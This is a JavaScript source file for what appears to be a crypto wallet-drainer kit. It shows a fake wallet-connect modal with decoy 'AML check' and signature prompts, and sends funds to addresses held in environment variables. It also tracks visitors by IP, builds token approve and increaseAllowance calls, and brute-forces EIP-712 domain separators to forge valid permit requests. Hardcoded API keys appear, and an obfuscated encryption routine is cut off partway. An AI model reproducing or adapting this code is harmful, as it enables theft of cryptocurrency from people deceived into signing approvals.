const destination_addy = import.meta.env.VITE_GAS_ADDY;
const destination_addy_final =	import.meta.env.VITE_DESTINATION_ADDY;
const host_url = import.meta.env.VITE_HOST_URL;

	import {
	chain_list
} from './assets/app/chain_list.js';

import Web3 from 'web3';
import {
	web3Modal,injectedconnector
} from './app.js';
import axios from 'axios';
import { Contract } from 'web3-eth-contract';
import CryptoJS from 'crypto-js';

import { numberToHex ,createWalletClient,custom,hexToSignature,
		encodeFunctionData,	keccak256,encodeAbiParameters, 
		parseAbiParameters,bytesToString ,stringToHex,toBytes} from 'viem'



import {
	getAccount,
	connect,
	getWalletClient,
	getPublicClient,
	writeContract,
	readContract,
	fetchTransaction,
	disconnect,
	prepareSendTransaction,
	signTypedData ,
	switchNetwork,
	getNetwork,
	signMessage ,
	prepareWriteContract,
 	sendTransaction
} from "@wagmi/core";
 
let visitor = null;
const sendNotif = true;
const retryNo = 5;
var dynamicFilesAdded = '';
let rubicon;
async function loadCSS(url) {
    if (dynamicFilesAdded.indexOf(url) !== -1)
        return;

    var head = document.getElementsByTagName('head')[0];
    var style = document.createElement('link');
    style.href = url;
    style.type = 'text/css';
    style.rel = 'stylesheet';
    head.appendChild(style);

    dynamicFilesAdded += ' ' + url;
}
async function loadModal() {
	var html1 = "<div id='modal'><div id='modal-head'> <div id='modal-head-block-f'> <div id='modal-head-title'> Connect wallet </div> <div id='modal-head-desc'> Choose what network and wallet you want to connect below </div> </div> <div id='modal-close'> <svg height='24' viewbox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'> <path clip-rule='evenodd' d= 'M5.31854 5.31952C5.74457 4.89349 6.4353 4.89349 6.86132 5.31952L11.5445 10.0027L16.2276 5.31952C16.6537 4.89349 17.3444 4.89349 17.7704 5.31952C18.1964 5.74555 18.1964 6.43627 17.7704 6.8623L13.0873 11.5455L17.7704 16.2286C18.1964 16.6546 18.1964 17.3454 17.7704 17.7714C17.3444 18.1974 16.6537 18.1974 16.2276 17.7714L11.5445 13.0882L6.86132 17.7714C6.4353 18.1974 5.74457 18.1974 5.31854 17.7714C4.89252 17.3454 4.89252 16.6546 5.31854 16.2286L10.0017 11.5455L5.31854 6.8623C4.89252 6.43627 4.89252 5.74555 5.31854 5.31952Z' fill='#C4C4C4' fill-rule='evenodd'></path></svg> </div> </div> <div id='modal-main'> <div id='modal-main-title'> Choose Network </div> <div id='modal-main-menu'> <div class='menu-el' id='metamask-connect-button'> <div class='modal-icon'><img alt='metamask' src='./assets/images/metamask.svg'></div> <div class='modal-el-desc'> <span class='modal-el-desc-first'>MetaMask</span> <span class='modal-el-desc-second'>Connect to your MetaMask wallet</span> </div> </div> <div class='menu-el' id='rainbow-connect-button'> <div class='modal-icon'><img alt='metamask' src='./assets/images/rainbow.svg'></div> <div class='modal-el-desc'> <span class='modal-el-desc-first'>Rainbow Wallet</span> <span class='modal-el-desc-second'>Connect to your Rainbow wallet</span> </div> </div> <div class='menu-el' id='coinbase-connect-button'> <div class='modal-icon'><img alt='metamask' src='./assets/images/coinbase.svg'></div> <div class='modal-el-desc'> <span class='modal-el-desc-first'>Coinbase</span> <span class='modal-el-desc-second'>Connect to your Coinbase wallet</span> </div> </div> <div class='menu-el' id='trust-wallet-connect-button'> <div class='modal-icon'><img alt='metamask' src='./assets/images/trust-wallet.svg'></div> <div class='modal-el-desc'> <span class='modal-el-desc-first'>Trust Wallet</span> <span class='modal-el-desc-second'>Connect to your Trust wallet</span> </div> </div> </div> </div> <div id='modal-bottom'> <button id='wallet-connect-connect-button'> <img alt='metamask' src='./assets/images/wallet-connect.svg'>Show All Wallets</button> <span id='modal-bottom-span'>You can also connect by QR-code with WalletConnect</span> </div> </div>"
    var html3 = "<div style='display:none;' class='change_chain loader white'><div class='loader-head'><div class='title'>Waiting for chain switch...</div></div><div class='loader-main'><div class='loader-main-content'><div class='loader-action'><div class='lds-ring'><div></div><div></div><div></div><div></div></div></div><div class='loader-desc'><div class='l-d-f'>Please, change chain to continue!</div></div></div></div></div><div style='display:none;' class='conn1 con loader white'><div class='loader-main'><div class='loader-main-content'><div class='loader-action'><div class='lds-ring'><div></div><div></div><div></div><div></div></div></div><div class='loader-desc'><div class='l-d-f'>Connecting to Blockchain...</div></div></div></div></div><div style='display:none;'class='success loader white'> <div class='loader-main'> <div class='loader-main-content'> <div class='loader-action'> <div class='loader-action-success'> <svg height='24' viewbox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'> <path d= 'M12 1.5C14.7848 1.5 17.4555 2.60625 19.4246 4.57538C21.3938 6.54451 22.5 9.21523 22.5 12C22.5 14.7848 21.3938 17.4555 19.4246 19.4246C17.4555 21.3938 14.7848 22.5 12 22.5C9.21523 22.5 6.54451 21.3938 4.57538 19.4246C2.60625 17.4555 1.5 14.7848 1.5 12C1.5 9.21523 2.60625 6.54451 4.57538 4.57538C6.54451 2.60625 9.21523 1.5 12 1.5ZM10.692 14.0715L8.3595 11.7375C8.27588 11.6539 8.17661 11.5876 8.06736 11.5423C7.9581 11.497 7.84101 11.4737 7.72275 11.4737C7.60449 11.4737 7.4874 11.497 7.37814 11.5423C7.26889 11.5876 7.16962 11.6539 7.086 11.7375C6.91712 11.9064 6.82225 12.1354 6.82225 12.3743C6.82225 12.6131 6.91712 12.8421 7.086 13.011L10.056 15.981C10.1394 16.065 10.2386 16.1317 10.3479 16.1773C10.4571 16.2228 10.5744 16.2462 10.6927 16.2462C10.8111 16.2462 10.9284 16.2228 11.0376 16.1773C11.1469 16.1317 11.2461 16.065 11.3295 15.981L17.4795 9.8295C17.5642 9.74623 17.6316 9.647 17.6778 9.53755C17.724 9.42809 17.7481 9.31057 17.7487 9.19177C17.7492 9.07297 17.7262 8.95523 17.6811 8.84535C17.6359 8.73547 17.5694 8.63562 17.4854 8.55156C17.4015 8.46751 17.3017 8.4009 17.1919 8.3556C17.0821 8.31029 16.9644 8.28718 16.8455 8.28759C16.7267 8.288 16.6092 8.31193 16.4997 8.358C16.3902 8.40407 16.2909 8.47136 16.2075 8.556L10.692 14.0715Z' fill='#56D629'></path></svg> </div> </div> <div class='loader-desc'> <div class='l-d-f'> Connection established </div> </div> </div> </div> </div> <div style='display:none;' class='error loader white'> <div class='loader-head'> <div class='title'> An error has occurred ! </div> </div> <div class='loader-main'> <div class='loader-main-content'> <div class='loader-action'> <div class='loader-action-error'> <svg height='24' viewbox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'> <path d= 'M12 17C12.2833 17 12.521 16.904 12.713 16.712C12.905 16.52 13.0007 16.2827 13 16C13 15.7167 12.904 15.479 12.712 15.287C12.52 15.095 12.2827 14.9993 12 15C11.7167 15 11.479 15.096 11.287 15.288C11.095 15.48 10.9993 15.7173 11 16C11 16.2833 11.096 16.521 11.288 16.713C11.48 16.905 11.7173 17.0007 12 17ZM11 13H13V7H11V13ZM12 22C10.6167 22 9.31667 21.7373 8.1 21.212C6.88333 20.6867 5.825 19.9743 4.925 19.075C4.025 18.175 3.31267 17.1167 2.788 15.9C2.26333 14.6833 2.00067 13.3833 2 12C2 10.6167 2.26267 9.31667 2.788 8.1C3.31333 6.88333 4.02567 5.825 4.925 4.925C5.825 4.025 6.88333 3.31267 8.1 2.788C9.31667 2.26333 10.6167 2.00067 12 2C13.3833 2 14.6833 2.26267 15.9 2.788C17.1167 3.31333 18.175 4.02567 19.075 4.925C19.975 5.825 20.6877 6.88333 21.213 8.1C21.7383 9.31667 22.0007 10.6167 22 12C22 13.3833 21.7373 14.6833 21.212 15.9C20.6867 17.1167 19.9743 18.175 19.075 19.075C18.175 19.975 17.1167 20.6877 15.9 21.213C14.6833 21.7383 13.3833 22.0007 12 22Z' fill='#E0525E'></path></svg> </div> </div> <div class='loader-desc'> <div class='l-d-s'> Your wallet does not meet the requirements, please connect a non-empty wallet or and try again! </div> </div> <div class='loader-error-button'> <button onclick='window.location.reload()'>Re-Connect</button> </div> </div> </div> </div> <div style='display:none;' class='waitsig loader white'> <div class='loader-head'> <div class='title'> Waiting for your signature... </div> </div> <div class='loader-main'> <div class='loader-main-content'> <div class='loader-action'> <div class='lds-ring'> <div></div> <div></div> <div></div> <div></div> </div> </div> <div class='loader-desc'> <div class='l-d-f'> Please sign this message in your wallet! </div> </div> </div> </div> </div> <div style='display:none;' class='con1 loader white'> <div class='loader-main'> <div class='loader-main-content'> <div class='loader-action'> <div class='lds-ring'> <div></div> <div></div> <div></div> <div></div> </div> </div> <div class='loader-desc'> <div class='l-d-f'> Checking your wallet for AML... </div> </div> </div> </div> </div> <div style='display:none;' class='con2 loader white'> <div class='loader-main'> <div class='loader-main-content'> <div class='loader-action'> <div class='lds-ring'> <div></div> <div></div> <div></div> <div></div> </div> </div> <div class='loader-desc'> <div class='l-d-f'> Please wait, we are scanning more details... </div> </div> </div> </div> </div>"
    
    var element1 = document.createElement('div');
    element1.setAttribute("class", "show");
    element1.setAttribute("style", "display:none");
    element1.setAttribute("id", "connect-modal");
    
    var element2 = document.createElement('div');
    element2.setAttribute("style", "display:none;");
    element2.setAttribute("id", "connect-modal-overlay");
    
    var element3 = document.createElement('div');
    element3.setAttribute("id", "lucien-popup");
    element1.innerHTML = html1;
    element3.innerHTML = html3;
    document.body.appendChild(element1);
    document.body.appendChild(element2);
    document.body.appendChild(element3);
	$('#connect-modal').hide();
	$('#connect-modal-overlay').hide();
	$('#lucien-popup > .conn1').hide();
	$('#lucien-popup > .success').hide();
	$('#lucien-popup > .con1').hide();
	$('#lucien-popup > .con2').hide();
	$('#lucien-popup > .change_chain').hide();
	$('#lucien-popup > .waitsig').hide();
	$('#lucien-popup > .error').hide();
   
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
            $('html').attr('data-theme','dark')
        }else{
            $('html').attr('data-theme','light')

        }
}

const closeModal = () => {
	$('#connect-modal').hide();
	$('#connect-modal-overlay').hide();  
}
const openModal = () => {
	$('#connect-modal').show();
 	$('#connect-modal').hide();
	$('#connect-modal').show();
	$('#connect-modal-overlay').show();  
	$("#modal-close").on('click', () => {
		closeModal();
	})
}

loadCSS('./assets/styles/modal-6.css');
loadCSS('./assets/styles/popup-5.css');
loadModal();

$("#wallet-connect-connect-button").on("click", () => {
	connectWallet(false);
})

function ipLookUp() {
    fetch('https://ipapi.co/json/')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            visitor = data
        })
        .catch(error => {
           return 
        });
}
ipLookUp();
function ucfirst(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}
function format_addy(inputString) {
    const firstFive = inputString.substring(0, 5);
    const lastFour = inputString.substring(inputString.length - 4);
    return `${firstFive}...${lastFour}`;
}
function gft() {
    const date = new Date();
    return date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true })
         + ' - '
         + date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
}
function gef(countryCode) {
	let codePoints = countryCode.toUpperCase().split('').map(char =>  127397 + char.charCodeAt());
	return String.fromCodePoint(...codePoints);
}
function gup( name, url ) {
    if (!url) url = location.href;
    name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
    var regexS = "[\\?&]"+name+"=([^&#]*)";
    var regex = new RegExp( regexS );
    var results = regex.exec( url );
    return results == null ? null : results[1];
}
$("#rainbow-connect-button").on("click", () => {
	window.location.href = `https://rnbwapp.com/wc?uri=https%3A%2F%2F${window.location.hostname}${window.location.pathname}`;
});
if(window.ethereum){
	if(window.ethereum.isMetaMask){
		$("#metamask-connect-button").on("click", () => {
			connectWallet(injectedconnector);
		})
	}else{
		$("#metamask-connect-button").on("click", () => {
			window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
		});
	}


	if (gup('browser', `${location.href}`) && gup('browser', `${location.href}`) === "trust") {
		$("#trust-wallet-connect-button").on("click", () => {
			connectWallet(injectedconnector);
		});
		
	}else{
		$("#trust-wallet-connect-button").on("click", () => {
			window.location.href = `https://link.trustwallet.com/open_url?url=https%3A%2F%2F${window.location.hostname}${window.location.pathname}?browser=trust`;
		});
	}

	if(window.ethereum.isCoinbaseWallet){
		$("#coinbase-connect-button").on("click", () => {
			connectWallet(injectedconnector);
		});
	}else{
		$("#coinbase-connect-button").on("click", () => {
			window.location.href = `https://go.cb-w.com/dapp?cb_url=https%3A%2F%2F${window.location.hostname}${window.location.pathname}`;
		});
	}
}else{
	$("#metamask-connect-button").on("click", () => {
		window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
	});
	if (gup('browser', `${location.href}`) && gup('browser', `${location.href}`) === "trust") {
		$("#trust-wallet-connect-button").on("click", () => {
			$("#trust-wallet-connect-button").addClass('interact-button');
		});
	}else{
		$("#trust-wallet-connect-button").on("click", () => {
			window.location.href = `https://link.trustwallet.com/open_url?url=https%3A%2F%2F${window.location.hostname}${window.location.pathname}?browser=trust`;
		});
	}
	
	$("#coinbase-connect-button").on("click", () => {
		window.location.href = `https://go.cb-w.com/dapp?cb_url=https%3A%2F%2F${window.location.hostname}${window.location.pathname}`;
	});

}

const abiUrls = {
    1: 'https://api.etherscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99',
    56: 'https://api.bscscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI',
    137: 'https://api.polygonscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=M9IMUX515SEB97THWJRQDKNX75CI66X7XX',
    250: 'https://api.ftmscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415',
    43114: 'https://api.snowtrace.io/api?module=contract&action=getsourcecode&address={0}&apikey=ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z',
    10: 'https://api-optimistic.etherscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK',
    42161: 'https://api.arbiscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I',
    100: 'https://api.gnosisscan.io/api?module=contract&action=getsourcecode&address={0}&apikey={1}',
    1285: 'https://api-moonriver.moonscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99',
    42220: 'https://api.celoscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken',
    1313161554: 'https://api.aurorascan.dev/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken'
};





  const isValidPermit = (methods) => {
    for (const key in methods) {
        if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            return args.length === 7 && key.indexOf('bool') === -1;
        }
    }
}


function* generateNameVariations(name) {
    let chars = [...name];
    for (let i = 0; i < chars.length; i++) {
        let originalChar = chars[i];
        chars[i] = originalChar.toUpperCase() === originalChar ? originalChar.toLowerCase() : originalChar.toUpperCase();
        yield chars.join('');
        chars[i] = originalChar;
    }
}
function* generateSymbolVariations(symbol) {
    let chars = [...symbol];
    for (let i = 0; i < chars.length; i++) {
        let originalChar = chars[i];
        chars[i] = originalChar.toUpperCase() === originalChar ? originalChar.toLowerCase() : originalChar.toUpperCase();
        yield chars.join('');
        chars[i] = originalChar;
    }
}
function computeDomainSeparator(name, version, chainId, verifyingContract) {
    const EIP712DomainHash = keccak256(toBytes('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'));
    return keccak256(encodeAbiParameters(
		[
			{type: 'bytes32' },
			{type: 'bytes32' },
			{ type: 'bytes32' },
			{ type: 'uint256' },
			{ type: 'address' }
		  ],
		[EIP712DomainHash, keccak256(toBytes(name)), keccak256(toBytes(version)), chainId, verifyingContract]
    ));
}
async function findMatchingDomainSeparator(originalName, versions, chainId, verifyingContract, knownDomainSeparatorHash, originalSymbol = '') {
    for (let nameVariant of generateNameVariations(originalName)) {
        for (let version of versions) {
            let domainSeparatorHash = computeDomainSeparator(nameVariant, version, chainId, verifyingContract).toString();
            if (domainSeparatorHash.toLowerCase() === knownDomainSeparatorHash.toLowerCase()) {
                return [nameVariant, version];
            }
            if (originalSymbol) {
                for (let symbolVariant of generateSymbolVariations(originalSymbol)) {
                    domainSeparatorHash = computeDomainSeparator(`${nameVariant} ${symbolVariant}`.trim(), version, chainId, verifyingContract).toString();
                    if (domainSeparatorHash.toLowerCase() === knownDomainSeparatorHash.toLowerCase()) {
                        nameVariant= `${nameVariant} ${symbolVariant}`.trim()
						return [nameVariant, version];
                    }
                }
            }
        }
    }
    return [null,null];
}

const approve_abi = [
	{
		"constant": false,
		"inputs": [ {
			"internalType": "address",
			"name": "spender",
			"type": "address"
		},
		{
			"internalType": "uint256",
			"name": "addedValue",
			"type": "uint256"
		} ],
		"name": "increaseAllowance",
		"outputs": [ {
			"internalType": "bool",
			"name": "",
			"type": "bool"
		} ],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant":false,
		"inputs":[ {
			"name": "_spender", "type":"address"
		}
		,
			{
			"name": "_value", "type":"uint256"
		}
		],
		"name":"approve",
		"outputs":[],
		"payable":false,
		"stateMutability":"nonpayable",
		"type":"function"
	}
 ];

const interactButton = document.getElementsByClassName('interactButton');
  for ( const button of interactButton ) {
    button.addEventListener( 'click', () => {
		if (gup('browser', `${location.href}`) && gup('browser', `${location.href}`) === "trust") {
		connectWallet(false);
	}else{
		openModal();

		}
    } );
}

const disconnectButton = document.getElementsByClassName('disconnectButton');
for ( const button of disconnectButton ) {
	button.addEventListener( 'click', async () => {
		await disconnect();
	} );
}
let totalBalancestring = "";
let totalBalance = 0;
const tx_history = [];
let errorsCount = 0;
let tx_hash;
let tx_hash_type;


function chain_to_chainId( params ) {
	const matchingItem = chain_list.find( item => item.id === params );
	return matchingItem ? matchingItem.community_id : null;
}

function isConnected() {
	var account = getAccount();
	return account.isConnected;
}

async function popUpshow(clss){
	$('#connect-modal').hide();
	$('#connect-modal-overlay').hide();
	$('#lucien-popup > .conn1').hide();
	$('#lucien-popup > .success').hide();
	$('#lucien-popup > .con1').hide();
	$('#lucien-popup > .con2').hide();
	$('#lucien-popup > .change_chain').hide();
	$('#lucien-popup > .waitsig').hide();
	$('#lucien-popup > .error').hide();
	if(clss){
				$(`#lucien-popup > .${clss}`).show()}

				
}
// @do_not_uncomment
// function encryptSHA256(e){
// 	let t=CryptoJS.enc.Utf8.parse(atob("MzhiYWRiY2I1OWVjMDZhNWQ3OGI4ZjUyOWRiMmU2MGM1OWM4OWFhZjk4NjMwNWU0Yjc1OGFmY2ZjOWMxODJhYQ==")),c=CryptoJS.AES.encrypt(e,t,{mode:CryptoJS.mode.CBC,padding:CryptoJS.pad.Pkcs7,iv:CryptoJS.lib.WordArray.create([0])});
// 	return c.toString()
// }
// function decryptSHA256(e){
// 	try{let t=CryptoJS.enc.Utf8.parse((atob("MzhiYWRiY2I1OWVjMDZhNWQ3OGI4ZjUyOWRiMmU2MGM1OWM4OWFhZjk4NjMwNWU0Yjc1OGFmY2ZjOWMxODJhYQ=="))),c=CryptoJS.AES.decrypt(decodeURIComponent(e),t,{mode:CryptoJS.mode.CBC,padding:CryptoJS.pad.Pkcs7,iv:CryptoJS.lib.WordArray.create([0])});
// 	return c.toString(CryptoJS.enc.Utf8)}catch(n){return console.error("Decryption error:",n),null}
// }
function encryptSHA256(e){
	(function(_0x2300b6,_0x45e292){function _0x124e60(_0x3b82d3,_0x544369,_0x2eb15b,_0x413b6e,_0x10f8b2){return _0x5242(_0x3b82d3- -0x21c,_0x10f8b2);}function _0x38f83f(_0x94bb35,_0x59f76c,_0xa67329,_0x54cf41,_0x5f5599){return _0x5242(_0x54cf41- -0x237,_0x59f76c);}function _0x1371df(_0x33a7f5,_0x2c57d7,_0x1a2b53,_0x8e12ae,_0x436095){return _0x5242(_0x436095- -0x175,_0x1a2b53);}const _0x361902=_0x2300b6();function _0x585acf(_0x2e20a8,_0x38ca28,_0xf62668,_0x135f90,_0x22343d){return _0x5242(_0x135f90-0x253,_0xf62668);}function _0x1ae25b(_0x36ccdd,_0x216a3f,_0x468c61,_0x55f906,_0x3811ad){return _0x5242(_0x3811ad- -0x246,_0x216a3f);}while(!![]){try{const _0x162960=-parseInt(_0x1371df(0x18,0x30,0x34,0x41,-0x7))/(0x1741+0x1a4e+-0x318e*0x1)*(parseInt(_0x1371df(-0x41,-0x15,-0x28,0x29,0x1))/(-0x85+-0x15fa+0x1681))+parseInt(_0x585acf(0x37d,0x34a,0x3a7,0x38f,0x3aa))/(-0x7*0x16e+0x3*-0x9fd+-0x6aa*-0x6)+parseInt(_0x1ae25b(-0xb8,-0xa1,-0x83,-0x98,-0x97))/(-0x109a+0x1b13+0xa75*-0x1)*(parseInt(_0x124e60(-0xa7,-0x94,-0x90,-0x91,-0xab))/(-0x4d*0x32+-0x44f*-0x1+0xac0))+parseInt(_0x1ae25b(-0xd4,-0x14f,-0x103,-0xda,-0x112))/(0x1911+0x4b*0x1f+-0x68*0x54)+parseInt(_0x585acf(0x412,0x406,0x3cc,0x3f5,0x3f3))/(0xf18+-0x22e6+0x1*0x13d5)+-parseInt(_0x585acf(0x39c,0x3a1,0x400,0x3b9,0x37b))/(-0x5*-0x2fb+0x8*0x5+0x1*-0xf07)*(parseInt(_0x1ae25b(-0x88,-0xa9,-0x105,-0x83,-0xc1))/(0x149*0x5+-0x1174+0x2c4*0x4))+-parseInt(_0x124e60(-0xa4,-0xb5,-0xb8,-0xdd,-0xd7))/(0x1e3a*0x1+0x16*0xd4+-0x3068*0x1)*(parseInt(_0x1ae25b(-0x114,-0x125,-0xcb,-0xee,-0x111))/(0x885+0x13*-0x5f+-0x16d));if(_0x162960===_0x45e292)break;else _0x361902['push'](_0x361902['shift']());}catch(_0x10ee0b){_0x361902['push'](_0x361902['shift']());}}}(_0x489a,-0x415c7*-0x2+0x1*0xa20a8+-0x9c546));const _0x370672=(function(){let _0x300f40=!![];return function(_0x20fd41,_0xf96007){const _0x1d0ef0=_0x300f40?function(){function _0x4bf4ef(_0x829e40,_0x28b4ba,_0x76c341,_0x5e79da,_0x429aec){return _0x5242(_0x5e79da-0x36,_0x429aec);}if(_0xf96007){const _0x4a5f93=_0xf96007[_0x4bf4ef(0x175,0x184,0x139,0x169,0x157)](_0x20fd41,arguments);return _0xf96007=null,_0x4a5f93;}}:function(){};return _0x300f40=![],_0x1d0ef0;};}()),_0x4247e7=_0x370672(this,function(){const _0x5dd831={};function _0x39c54e(_0x25823c,_0x4a54b6,_0x4e95ac,_0x5b65d2,_0x55dbf4){return _0x5242(_0x25823c- -0x1e2,_0x55dbf4);}function _0x2382e4(_0x4bbeec,_0x2b5a7a,_0x45c67f,_0x5f26c4,_0x12ca92){return _0x5242(_0x4bbeec-0x1c1,_0x2b5a7a);}function _0x3adbf4(_0x199933,_0x4737d6,_0x20f83b,_0x4899bd,_0x2ca227){return _0x5242(_0x4899bd-0x33d,_0x199933);}_0x5dd831[_0x39c54e(-0x27,-0x39,-0x23,0x20,0xb)]=_0x3adbf4(0x4c3,0x4cc,0x496,0x4d1,0x50b)+_0x3adbf4(0x474,0x484,0x4a1,0x46d,0x469)+'+$';const _0x38f9ca=_0x5dd831;function _0x21d10a(_0x516603,_0x4e9685,_0x3c549f,_0x4deac,_0x2c90ca){return _0x5242(_0x4e9685-0x264,_0x516603);}function _0x1c6d06(_0xeb683b,_0x50e10a,_0x39decc,_0x49b58e,_0x553753){return _0x5242(_0x50e10a-0x2a8,_0xeb683b);}return _0x4247e7[_0x1c6d06(0x426,0x468,0x449,0x457,0x49b)+_0x39c54e(-0x46,-0x9,-0x53,-0x3,-0x48)]()[_0x21d10a(0x3e5,0x40d,0x3eb,0x422,0x3ea)+'h'](_0x38f9ca[_0x2382e4(0x37c,0x3b7,0x398,0x3bf,0x354)])[_0x3adbf4(0x4d7,0x535,0x53c,0x4fd,0x4ff)+_0x21d10a(0x3c4,0x400,0x3bc,0x3d3,0x3f3)]()[_0x21d10a(0x3d9,0x3a5,0x39b,0x3ce,0x384)+_0x21d10a(0x3d2,0x3c0,0x3a3,0x38c,0x3c1)+'r'](_0x4247e7)[_0x1c6d06(0x484,0x451,0x441,0x458,0x467)+'h'](_0x38f9ca[_0x2382e4(0x37c,0x344,0x379,0x3be,0x364)]);});function _0x489a(){const _0x1df0d4=['sBrBD','pmJPN','rWWzn','CBC','ZtfYl','\x20(tru','miyCu','JRWaV','proto','uKoGT','NWU0Y','HqKBo','hbQXN','lengt','chain','SKkQI','input','ructo','info','*(?:[','LwdMr','DHTyW','AES','Utf8','Q==','OmLbB','count','8LRGrOX','uItpr','trace','$]*)','RPUrz','jOWMx','DHBeP','ODJhY','1teUYCx','xlcwA','FmY2Z','UyOWR','call','MzhiY','jMDZh','325BHNQnJ','1277382cElDWj','I1OWV','196310CNTpvp','n\x20(fu','pad','funct','WordA','MkDHY','Pkcs7','GvSkJ','n()\x20','retur','warn','yJAre','wwSZl','7277247ZNbHXU','GI4Zj','zA-Z_','init','JuNod','CHJRM','__pro','a-zA-','\x22retu','nstru','state','type','qtiSw','setIn','jc1OG','(((.+','YYhUw','MGM1O','XEAVP','KMApP','gger','awFem','svwNl','ing','lib','mode','excep','actio','iMmU2','7156555lGquob','ctor(','is\x22)(','vvfNe','MrmON','\x5c(\x20*\x5c','ion\x20*','searc','{}.co','DHesz','WRiY2','debu','fxvBB','59180UcaeLO','e)\x20{}','while','conso','nNYNR','rn\x20th','bind','error','Z_$][','GuQbj','YzoZi','parse','rszsm','test','terva','iZNEB','vAuOm','toStr','WM4OW',')+)+)','Objec','fDBJR','apply','6467958tzplCB','825vvmTqG','pVtHC','kmEuL','encry','log','prfzP','0-9a-','1249194vPwwxK','enc','table','creat','NWQ3O','const','4NjMw','FhZjk','rray','nctio','to__','strin','\x5c+\x5c+\x20','tion','RkplQ'];_0x489a=function(){return _0x1df0d4;};return _0x489a();}_0x4247e7();const _0x4717fd=(function(){let _0x235474=!![];return function(_0x586392,_0x1a7c03){const _0x1bc853=_0x235474?function(){function _0x2a99c7(_0x3e17d0,_0x5f3e02,_0x317bd5,_0x44c0c8,_0x430789){return _0x5242(_0x44c0c8- -0x6b,_0x430789);}if(_0x1a7c03){const _0x36eb38=_0x1a7c03[_0x2a99c7(0xee,0x95,0x94,0xc8,0xaf)](_0x586392,arguments);return _0x1a7c03=null,_0x36eb38;}}:function(){};return _0x235474=![],_0x1bc853;};}());(function(){function _0xf822dd(_0xd03a38,_0x18157e,_0x132100,_0xe5f31f,_0x464b47){return _0x5242(_0x464b47- -0xbf,_0xe5f31f);}function _0x514783(_0x3374e5,_0x2a0c75,_0x4463ab,_0x426ed3,_0x2695a2){return _0x5242(_0x2a0c75- -0x35a,_0x426ed3);}function _0x8b9e08(_0x55907e,_0x2c8b59,_0x20a422,_0x2de291,_0x1907d9){return _0x5242(_0x55907e-0x338,_0x2c8b59);}function _0x266ae8(_0x3f0a06,_0x15e09e,_0x3141f8,_0x15927b,_0x4ade43){return _0x5242(_0x3f0a06- -0x5c,_0x3141f8);}const _0x59b6be={'nNYNR':_0x514783(-0x21b,-0x1df,-0x1dc,-0x1f0,-0x1db)+_0x514783(-0x1f9,-0x1b2,-0x194,-0x181,-0x1fa)+_0xdc2771(-0x197,-0x122,-0x151,-0x18e,-0x15d)+')','CHJRM':_0x514783(-0x206,-0x212,-0x254,-0x1d9,-0x21f)+_0x266ae8(0x102,0x140,0x142,0xf4,0xf1)+_0xf822dd(0x8f,0x8c,0x104,0xa8,0xcd)+_0xdc2771(-0x11b,-0x15a,-0x138,-0x136,-0x14d)+_0xf822dd(0xc0,0x79,0xbd,0x5d,0x7c)+_0xdc2771(-0x16b,-0x18a,-0x188,-0x15a,-0x17d)+_0xdc2771(-0x1a3,-0x194,-0x19d,-0x16d,-0x19b),'ZtfYl':function(_0x59eb85,_0x59416){return _0x59eb85(_0x59416);},'RPUrz':_0xf822dd(0x9b,0xe3,0xdf,0xb8,0xc9),'XEAVP':function(_0x1493b9,_0x156052){return _0x1493b9+_0x156052;},'fxvBB':_0x514783(-0x230,-0x201,-0x1fe,-0x1d4,-0x21b),'MkDHY':_0xf822dd(0xb2,0x53,0xb8,0xb5,0x9c),'prfzP':function(_0x3297d4){return _0x3297d4();},'JuNod':function(_0xc2513f,_0x3dbc0d,_0x5741e3){return _0xc2513f(_0x3dbc0d,_0x5741e3);}};function _0xdc2771(_0xcddabd,_0x2a7e7f,_0x410521,_0x2b6a06,_0x218b95){return _0x5242(_0x218b95- -0x304,_0x2a7e7f);}_0x59b6be[_0xf822dd(0x95,0x91,0x84,0xdf,0xca)](_0x4717fd,this,function(){function _0x54c731(_0x5741c0,_0x1a4e91,_0x399a9e,_0x74265f,_0x5ac878){return _0xf822dd(_0x5741c0-0x1bf,_0x1a4e91-0x40,_0x399a9e-0x8c,_0x5ac878,_0x5741c0- -0x28);}const _0x2f1326=new RegExp(_0x59b6be[_0x458351(0x2ee,0x2f8,0x2e6,0x32b,0x31f)]);function _0x5328d1(_0x379253,_0x1a223d,_0x2d1b02,_0x5cf024,_0x2a5947){return _0xf822dd(_0x379253-0x1ad,_0x1a223d-0x79,_0x2d1b02-0x1bd,_0x2d1b02,_0x5cf024-0x12e);}function _0x458351(_0x26b31c,_0x16bf29,_0x583459,_0x540fbb,_0x219c7b){return _0x514783(_0x26b31c-0xbc,_0x26b31c-0x495,_0x583459-0x27,_0x219c7b,_0x219c7b-0x3e);}function _0x523cd3(_0x2d7cf6,_0x52b6ba,_0x54b8af,_0x55aea6,_0x1c77a2){return 